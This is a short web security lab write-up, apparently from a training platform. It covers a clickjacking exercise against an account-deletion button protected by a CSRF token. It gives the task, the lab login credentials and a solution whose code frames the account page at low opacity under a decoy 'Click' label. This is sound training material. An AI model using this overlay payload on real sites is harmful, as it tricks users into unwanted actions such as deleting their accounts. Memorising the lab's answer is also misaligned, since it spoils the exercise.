# Basic clickjacking with CSRF token protection
APPRENTICE

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter

## Решение
```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:300px;
       left:60px;
       z-index: 1;
   }
</style>
<div>
Click
</div>
<iframe src="https://0a35007903e8d36080b23f7b00ee00ff.web-security-academy.net/my-account"></iframe>
```
